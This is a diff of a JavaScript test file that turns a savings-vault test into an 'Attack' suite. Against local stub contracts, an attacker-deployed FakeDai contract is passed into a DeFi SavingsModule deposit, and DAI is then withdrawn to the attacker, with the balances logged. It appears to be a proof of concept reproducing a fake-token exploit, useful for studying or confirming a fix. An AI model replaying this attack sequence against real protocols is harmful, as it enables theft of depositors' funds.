@@ -1,176 +1,365 @@
 /** @format */
-const { ether } = require('@openzeppelin/test-helpers');
+const { ether, time } = require('@openzeppelin/test-helpers');
 const { accounts, contract } = require('@openzeppelin/test-environment');
-const { expect } = require('chai');
+const { expect, use } = require('chai');
+const web3 = require('web3');
 
-const ERC20 = contract.fromArtifact('TestERC20');
-const VaultProtocol = contract.fromArtifact('VaultProtocol');
-const VaultSavings = contract.fromArtifact('VaultSavingsModule');
-const VaultStrategy = contract.fromArtifact('VaultStrategyStub');
-const PoolToken = contract.fromArtifact('VaultPoolToken');
+const FakeDai = contract.fromArtifact('FakeDai');
+const CurveFiProtocol_Y = contract.fromArtifact('CurveFiProtocol_Y');
 const Pool = contract.fromArtifact('Pool');
 const AccessModule = contract.fromArtifact('AccessModule');
-const FakeDai = contract.fromArtifact('FakeDai');
+const SavingsModule = contract.fromArtifact('SavingsModule');
+const StakingPool = contract.fromArtifact('StakingPool');
+const FreeERC20 = contract.fromArtifact('FreeERC20');
+const StakingPoolADEL = contract.fromArtifact('StakingPoolADEL');
+const PoolTokenCurveFiY = contract.fromArtifact('PoolToken_CurveFi_Y');
+const ERC20 = contract.fromArtifact('TestERC20');
+const YERC20 = contract.fromArtifact('YTokenStub');
+const CurveSwap = contract.fromArtifact('CurveFiSwapStub_Y');
+const CurveDeposit = contract.fromArtifact('CurveFiDepositStub_Y');
+const CurveMinter = contract.fromArtifact('CurveFiMinterStub');
+const CurveGauge = contract.fromArtifact('CurveFiLiquidityGaugeStub');
+const RewardVestingModule = contract.fromArtifact('RewardVestingModule');
+const RewardDistributionModule = contract.fromArtifact('RewardDistributionModule');
+const IERC20 = contract.fromArtifact('IERC20');
 
-describe('VaultSavings', function() {
-  const [
-    _,
-    owner,
-    user1,
-    user2,
-    user3,
-    defiops,
-    protocolStub,
-    attacker,
-    ...otherAccounts
-  ] = accounts;
+const Dexag = contract.fromArtifact('DexagStub');
+
+describe('Attack', function() {
+  const [owner, user, attacker, ...otherAccounts] = accounts;
 
   let dai,
     usdc,
     busd,
+    usdt,
+    tokens,
+    yDai,
+    yUsdc,
+    yBusd,
+    yUsdt,
+    curveSwap,
+    curveDeposit,
+    crvToken,
+    curveMinter,
+    weth,
+    dexag,
     fakeDai,
+    curveFiProtocolY,
     pool,
     accessModule,
-    vaultSavings,
-    vaultProtocol,
-    poolToken,
-    strategy;
+    savingsModule,
+    akro,
+    stakingPoolAkro,
+    adel,
+    stakingPoolAdel,
+    dDAI,
+    rewardVesting,
+    rewardDistributions,
+    curveToken;
 
   before(async () => {
+    // fakeDai = await FakeDai.new({ from: owner });
+    // await fakeDai.methods['initialize(string,string,uint8)']('Fake Dai', 'FAKEDAI', 18, {
+    //   from: owner,
+    // });
+
     dai = await ERC20.new({ from: owner });
-    await dai.methods['initialize(string,string,uint8)']('DAI', 'DAI', 18, {
-      from: owner,
-    });
+    await dai.methods['initialize(string,string,uint8)']('DAI', 'DAI', 18, { from: owner });
+    await dai.methods['mint(address,uint256)'](owner, '50000000000000000000000', { from: owner });
 
     usdc = await ERC20.new({ from: owner });
-    await usdc.methods['initialize(string,string,uint8)']('USDC', 'USDC', 18, {
-      from: owner,
-    });
+    await usdc.methods['initialize(string,string,uint8)']('USDC', 'USDC', 6, { from: owner });
+    await usdc.methods['mint(address,uint256)'](owner, '500000000000', { from: owner });
 
     busd = await ERC20.new({ from: owner });
-    await busd.methods['initialize(string,string,uint8)']('BUSD', 'BUSD', 18, {
+    await busd.methods['initialize(string,string,uint8)']('BUSD', 'BUSD', 6, { from: owner });
+    await busd.methods['mint(address,uint256)'](owner, '500000000000', { from: owner });
+
+    usdt = await ERC20.new({ from: owner });
+    await usdt.methods['initialize(string,string,uint8)']('USDT', 'USDT', 18, { from: owner });
+    await usdt.methods['mint(address,uint256)'](owner, '50000000000000000000000', { from: owner });
+
+    tokens = [dai.address, usdc.address, busd.address, usdt.address];
+
+    yDai = await YERC20.new({ from: owner });
+    await yDai.methods['initialize(address,string,uint8)'](dai.address, 'yDAI', 18, {
       from: owner,
     });
 
-    fakeDai = await FakeDai.new({ from: attacker });
-    await fakeDai.initialize('FAKEDAI', 'FAKEDAI', 18, { from: attacker });
-    await fakeDai.mint(attacker, ether('1000'), { from: attacker });
+    yUsdc = await YERC20.new({ from: owner });
+    await yUsdc.methods['initialize(address,string,uint8)'](usdc.address, 'yUSDC', 6, {
+      from: owner,
+    });
 
-    await dai.mint(user1, ether('1000'), { from: owner });
-    await dai.mint(user2, ether('1000'), { from: owner });
-    await dai.mint(user3, ether('1000'), { from: owner });
-    await dai.mint(fakeDai.address, ether('1000'), { from: owner });
+    yBusd = await YERC20.new({ from: owner });
+    await yBusd.methods['initialize(address,string,uint8)'](busd.address, 'yBUSD', 6, {
+      from: owner,
+    });
 
-    await usdc.mint(user1, ether('1000'), { from: owner });
-    await usdc.mint(user2, ether('1000'), { from: owner });
-    await usdc.mint(user3, ether('1000'), { from: owner });
+    yUsdt = await YERC20.new({ from: owner });
+    await yUsdt.methods['initialize(address,string,uint8)'](usdt.address, 'yUSDT', 18, {
+      from: owner,
+    });
 
-    await busd.mint(user1, ether('1000'), { from: owner });
-    await busd.mint(user2, ether('1000'), { from: owner });
-    await busd.mint(user3, ether('1000'), { from: owner });
+    curveSwap = await CurveSwap.new({ from: owner });
+    await curveSwap.methods['initialize(address[4])'](
+      [yDai.address, yUsdc.address, yBusd.address, yUsdt.address],
+      { from: owner }
+    );
+
+    curveDeposit = await CurveDeposit.new({ from: owner });
+    await curveDeposit.methods['initialize(address)'](curveSwap.address, { from: owner });
+
+    crvToken = await ERC20.new({ from: owner });
+    await crvToken.methods['initialize(string,string,uint8)']('CRV', 'CRV', 18, {
+      from: owner,
+    });
+
+    curveMinter = await CurveMinter.new({ from: owner });
+    await curveMinter.methods['initialize(address)'](crvToken.address, { from: owner });
+    await crvToken.methods['addMinter(address)'](curveMinter.address, { from: owner });
+
+    curveToken = await IERC20.at(await curveDeposit.token({ from: owner }));
+
+    curveGauge = await CurveGauge.new({ from: owner });
+    await curveGauge.methods['initialize(address,address,address)'](
+      curveToken.address,
+      curveMinter.address,
+      crvToken.address,
+      { from: owner }
+    );
+
+    // weth = await ERC20.new({ from: owner });
+    // await weth.methods['initialize(string,string,uint8)']('WETH', 'WETH', 18, {
+    //   from: owner,
+    // });
+
+    // dexag = await Dexag.new({ from: owner });
+    // await dexag.methods['setProtocol(address)'](weth.address, { from: owner });
 
     pool = await Pool.new({ from: owner });
     await pool.methods['initialize()']({ from: owner });
 
     accessModule = await AccessModule.new({ from: owner });
-    await accessModule.methods['initialize(address)'](pool.address, {
+    await accessModule.methods['initialize(address)'](pool.address, { from: owner });
+    await pool.methods['set(string,address,bool)']('access', accessModule.address, false, {
       from: owner,
     });
 
-    await pool.set('access', accessModule.address, true, { from: owner });
-
-    vaultSavings = await VaultSavings.new({ from: owner });
-    await vaultSavings.methods['initialize(address)'](pool.address, {
+    savingsModule = await SavingsModule.new({ from: owner });
+    await savingsModule.methods['initialize(address)'](pool.address, { from: owner });
+    await pool.methods['set(string,address,bool)']('savings', savingsModule.address, false, {
       from: owner,
     });
 
-    await vaultSavings.addVaultOperator(defiops, { from: owner });
+    akro = await FreeERC20.new({ from: owner });
+    await akro.methods['initialize(string,string)']('Akropolis', 'AKRO', { from: owner });
+    await pool.methods['set(string,address,bool)']('akro', akro.address, false, { from: owner });
 
-    await pool.set('vault', vaultSavings.address, true, { from: owner });
-
-    vaultProtocol = await VaultProtocol.new({ from: owner });
-    await vaultProtocol.methods['initialize(address,address[])'](
+    stakingPoolAkro = await StakingPool.new({ from: owner });
+    await stakingPoolAkro.methods['initialize(address,address,uint256)'](
       pool.address,
-      [dai.address, usdc.address, busd.address],
+      akro.address,
+      '0',
       { from: owner }
     );
-    await vaultProtocol.addDefiOperator(vaultSavings.address, { from: owner });
-    await vaultProtocol.addDefiOperator(defiops, { from: owner });
-
-    poolToken = await PoolToken.new({ from: owner });
-    await poolToken.methods['initialize(address,string,string)'](
-      pool.address,
-      'VaultSavings',
-      'VLT',
-      { from: owner }
-    );
-
-    await poolToken.addMinter(vaultSavings.address, { from: owner });
-    await poolToken.addMinter(vaultProtocol.address, { from: owner });
-    await poolToken.addMinter(defiops, { from: owner });
-
-    strategy = await VaultStrategy.new({ from: owner });
-    await strategy.methods['initialize(string)']('1', { from: owner });
-    await strategy.setProtocol(protocolStub, { from: owner });
-
-    await strategy.addDefiOperator(defiops, { from: owner });
-    await strategy.addDefiOperator(vaultProtocol.address, { from: owner });
-
-    await vaultProtocol.registerStrategy(strategy.address, { from: defiops });
-    await vaultProtocol.setQuickWithdrawStrategy(strategy.address, {
-      from: defiops,
-    });
-    await vaultProtocol.setAvailableEnabled(true, { from: owner });
-
-    await vaultSavings.registerVault(vaultProtocol.address, poolToken.address, {
+    await pool.methods['set(string,address,bool)']('staking', stakingPoolAkro.address, false, {
       from: owner,
     });
-  });
 
-  it('attack', async () => {
-    await dai.approve(vaultSavings.address, ether('1000'), { from: user1 });
-    await dai.approve(vaultSavings.address, ether('1000'), { from: user2 });
+    adel = await FreeERC20.new({ from: owner });
+    await adel.methods['initialize(string,string)']('Akropolis Delphi', 'ADEL', { from: owner });
+    await pool.methods['set(string,address,bool)']('adel', adel.address, false, { from: owner });
 
-    await fakeDai.approve(vaultSavings.address, ether('1000'), {
-      from: attacker,
+    stakingPoolAdel = await StakingPoolADEL.new({ from: owner });
+    await stakingPoolAdel.methods['initialize(address,address,uint256)'](
+      pool.address,
+      adel.address,
+      '0',
+      { from: owner }
+    );
+    await pool.methods['set(string,address,bool)']('stakingAdel', stakingPoolAdel.address, false, {
+      from: owner,
     });
 
-    await vaultSavings.deposit(
-      vaultProtocol.address,
-      [dai.address],
-      [ether('1000')],
+    await dai.methods['approve(address,uint256)'](curveDeposit.address, '1000000000000000000000', {
+      from: owner,
+    });
+    await usdc.methods['approve(address,uint256)'](curveDeposit.address, '1000000000', {
+      from: owner,
+    });
+    await busd.methods['approve(address,uint256)'](curveDeposit.address, '1000000000', {
+      from: owner,
+    });
+    await usdt.methods['approve(address,uint256)'](curveDeposit.address, '1000000000000000000000', {
+      from: owner,
+    });
+
+    await curveDeposit.methods['add_liquidity(uint256[4],uint256)'](
+      ['1000000000000000000000', '1000000000', '1000000000', '1000000000000000000000'],
+      0,
       {
-        from: user1,
+        from: owner,
       }
     );
 
-    await fakeDai.setRealDai(dai.address, { from: attacker });
-    await fakeDai.setVaultProtocol(vaultProtocol.address, { from: attacker });
-    await fakeDai.setVaultSavings(vaultSavings.address, { from: attacker });
+    curveFiProtocolY = await CurveFiProtocol_Y.new({ from: owner });
+    await curveFiProtocolY.methods['initialize(address)'](pool.address, { from: owner });
+    await curveFiProtocolY.methods['setCurveFi(address,address)'](
+      curveDeposit.address,
+      curveGauge.address,
+      { from: owner }
+    );
+    await curveFiProtocolY.methods['addDefiOperator(address)'](savingsModule.address, {
+      from: owner,
+    });
 
-    console.log(await fakeDai.realDai());
-    await vaultSavings.deposit(
-      vaultProtocol.address,
+    dDAI = await PoolTokenCurveFiY.new({ from: owner });
+    await dDAI.methods['initialize(address)'](pool.address, {
+      from: owner,
+    });
+    await dDAI.methods['addMinter(address)'](savingsModule.address, { from: owner });
+
+    await savingsModule.methods['registerProtocol(address,address)'](
+      curveFiProtocolY.address,
+      dDAI.address,
+      { from: owner }
+    );
+
+    rewardVesting = await RewardVestingModule.new({ from: owner });
+    await rewardVesting.methods['initialize(address)'](pool.address, { from: owner });
+
+    await pool.methods['set(string,address,bool)']('reward', rewardVesting.address, false, {
+      from: owner,
+    });
+
+    rewardDistributions = await RewardDistributionModule.new({ from: owner });
+    await rewardDistributions.methods['initialize(address)'](pool.address, { from: owner });
+
+    await pool.methods['set(string,address,bool)'](
+      'rewardDistributions',
+      rewardDistributions.address,
+      false,
+      { from: owner }
+    );
+
+    await rewardDistributions.methods['registerProtocol(address,address)'](
+      curveFiProtocolY.address,
+      dDAI.address,
+      { from: owner }
+    );
+  });
+
+  it('check', async () => {
+    console.log();
+    await dai.methods['transfer(address,uint256)'](user, '1000000000000000000', { from: owner });
+    await dai.methods['approve(address,uint256)'](savingsModule.address, '1000000000000000000', {
+      from: user,
+    });
+
+    fakeDai = await FakeDai.new({ from: attacker });
+    // await fakeDai.methods['initialize(string,string,uint8)']('Fake Dai', 'FAKEDAI', 18, {
+    //   from: owner,
+    // });
+
+    await fakeDai.setup(
+      dai.address,
+      curveFiProtocolY.address,
+      savingsModule.address,
+      '1000000000000000000',
+      { from: attacker }
+    );
+
+    await dai.methods['mint(address,uint256)'](fakeDai.address, '1000000000000000000', {
+      from: owner,
+    });
+
+    console.log(
+      parseInt(await dai.methods['balanceOf(address)'](fakeDai.address)) +
+        ' ' +
+        'DAI balance of Attack Contract before attack'
+    );
+
+    console.log(
+      parseInt(await dai.methods['balanceOf(address)'](user)) +
+        ' ' +
+        'DAI balance of User before deposit'
+    );
+
+    await fakeDai.methods['attack(address[],uint256[])'](
       [fakeDai.address],
-      [ether('1000')],
-      {
-        from: attacker,
-      }
+      ['1000000000000000000'],
+      { from: attacker }
     );
 
-    const user1PoolBalance = await poolToken.balanceOf(user1, { from: user1 });
-    const vaultBalance = await dai.balanceOf(vaultProtocol.address, {
+    await savingsModule.methods['deposit(address,address[],uint256[])'](
+      curveFiProtocolY.address,
+      [dai.address],
+      ['1000000000000000000'],
+      { from: user }
+    );
+
+    // console.log(
+    //   'DAI balance Protocol: ' +
+    //     parseInt(await dai.methods['balanceOf(address)'](curveFiProtocolY.address))
+    // );
+
+    // console.log(
+    //   'yDAI - DAI balance: ' + parseInt(await dai.methods['balanceOf(address)'](yDai.address))
+    // );
+
+    // console.log(
+    //   'CurveSwap - YDAI Balance: ' +
+    //     parseInt(await yDai.methods['balanceOf(address)'](curveSwap.address))
+    // );
+
+    // console.log(
+    //   'Gauge - CurveToken Balance: ' +
+    //     parseInt(await curveToken.methods['balanceOf(address)'](curveGauge.address))
+    // );
+
+    // console.log(
+    //   'User - dDAI balance: ' +
+    //     parseInt(await dDAI.methods['balanceOf(address)'](user, { from: user }))
+    // );
+
+    // console.log(
+    //   'Attack Contract - dDAI balance: ' +
+    //     parseInt(await dDAI.methods['balanceOf(address)'](fakeDai.address, { from: attacker }))
+    // );
+
+    await dai.methods['mint(address,uint256)'](curveFiProtocolY.address, '20000000000000000000', {
       from: owner,
     });
 
-    const user1OnHold = await vaultProtocol.amountOnHold(user1, dai.address, {
-      from: owner,
-    });
-    // console.log(parseInt(vaultBalance));
-    expect(user1PoolBalance).to.be.bignumber.equal(ether('1000'));
-    expect(vaultBalance).to.be.bignumber.equal(ether('1000'));
-    expect(user1OnHold).to.be.bignumber.equal(ether('1000'));
+    await savingsModule.methods[
+      'withdraw(address,address,uint256,uint256)'
+    ](curveFiProtocolY.address, dai.address, '1000000000000000000', '0', { from: user });
+
+    await fakeDai.methods['withdrawAttack(uint256)']('2000000000000000000', { from: attacker });
+
+    console.log(
+      parseInt(await dai.methods['balanceOf(address)'](user)) +
+        ' ' +
+        'DAI balance of User after withdraw'
+    );
+
+    console.log(
+      parseInt(await dai.methods['balanceOf(address)'](fakeDai.address)) +
+        ' ' +
+        'DAI balance of Attack Contract after Attack'
+    );
+
+    await fakeDai.methods['withdrawDAIToAttacker(address,uint256)'](
+      attacker,
+      '2000000000000000000',
+      { from: attacker }
+    );
+
+    console.log(
+      parseInt(await dai.methods['balanceOf(address)'](attacker)) +
+        ' ' +
+        'DAI balance of Attacker after withdraw'
+    );
   });
-
-  afterEach(async () => {});
 });
